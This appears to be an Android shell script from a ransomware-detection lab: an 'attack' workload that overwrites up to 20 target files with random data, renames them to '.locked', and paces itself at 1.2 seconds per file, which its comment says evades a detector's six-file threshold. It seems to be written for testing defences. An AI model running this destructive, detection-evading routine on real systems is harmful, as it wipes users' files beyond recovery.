#!/system/bin/sh
# E1 (Extreme): Low-and-slow pacing (DELAY=1.2s).
# Touches at most 5 files in any 5000ms window -> evades --min-files 6 completely!
DIR="$(cd "$(dirname "$0")" && pwd)"
WORKLOAD_NAME="E1_slow_drip"
WORKLOAD_LABEL="attack"
. "$DIR/lib.sh"

MAX_FILES="${MAX_FILES:-20}"
DELAY="${DELAY:-1.2}"

verify_lab_env
log_truth "start"

OLD_IFS="$IFS"
IFS='
'
for f in $(list_attack_targets "$MAX_FILES"); do
    IFS="$OLD_IFS"
    [ ! -f "$f" ] && continue
    sz="$(file_size "$f")"
    head -c "$sz" /dev/urandom > "$f"
    log_truth "overwrite" "$f"
    mv "$f" "${f}.locked"
    log_truth "rename" "$f" "${f}.locked"
    sleep "$DELAY"
done
IFS="$OLD_IFS"

log_truth "end"